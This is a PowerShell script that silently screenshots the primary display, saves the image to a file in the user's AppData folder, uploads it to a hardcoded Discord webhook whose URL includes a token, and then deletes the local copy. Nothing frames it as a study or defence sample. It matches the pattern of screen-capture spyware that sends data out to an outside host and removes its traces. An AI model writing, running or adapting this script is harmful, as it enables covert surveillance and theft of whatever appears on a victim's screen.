Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Get screen bounds
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

# Create bitmap object
$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height

# Create graphics object from bitmap
$graphics = [System.Drawing.Graphics]::FromImage($bmp)

# Copy screen to bitmap
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

# Save bitmap to a file in AppData
$savePath = "$env:APPDATA\sshot.png"
$bmp.Save($savePath)

# Dispose objects
$graphics.Dispose()
$bmp.Dispose()

# Discord webhook URL (replace with your webhook)
$hook = "https://discord.com/api/webhooks/1381264369278783629/PvED-2FqXoYTgjv1F1K584kIWw_66B-oJgGNcP58F0cvZuKaubUdnT2IwH9FKrNSX91z"

# Send screenshot to Discord via webhook
Invoke-RestMethod -Uri $hook -Method Post -Form @{
    file1 = Get-Item $savePath
    payload_json = '{"content":"📸 Screenshot"}'
}

# Optionally delete the screenshot after sending to save space
Remove-Item $savePath -ErrorAction SilentlyContinue
